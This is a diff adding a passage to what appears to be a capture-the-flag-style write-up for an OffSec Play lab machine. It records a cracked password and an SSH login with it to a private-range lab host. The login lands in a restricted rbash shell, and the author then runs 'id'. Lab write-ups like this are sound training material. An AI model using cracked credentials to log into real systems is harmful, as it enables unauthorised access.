@@ -203,3 +203,29 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 ![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/099ec0d4-40dc-45cf-bb0f-aed100f6a671)
+```shell
+password: server
+```
+
+SSH
+```shell
+> ssh 296640a3b825115a47b68fc44501c828@192.168.224.85
+> ssh 296640a3b825115a47b68fc44501c828@192.168.224.85
+The authenticity of host '192.168.224.85 (192.168.224.85)' can't be established.
+ED25519 key fingerprint is SHA256:qzYkm7MeglkL3QtA6bU4nv7yc8jlb1x7fZ7ALPBohNQ.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.224.85' (ED25519) to the list of known hosts.
+296640a3b825115a47b68fc44501c828@192.168.224.85's password: 
+Linux 60832e9f188106ec5bcc4eb7709ce592 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+-rbash: dircolors: command not found
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ id
+uid=1000(296640a3b825115a47b68fc44501c828) gid=1000(296640a3b825115a47b68fc44501c828) groups=1000(296640a3b825115a47b68fc44501c828)
+```
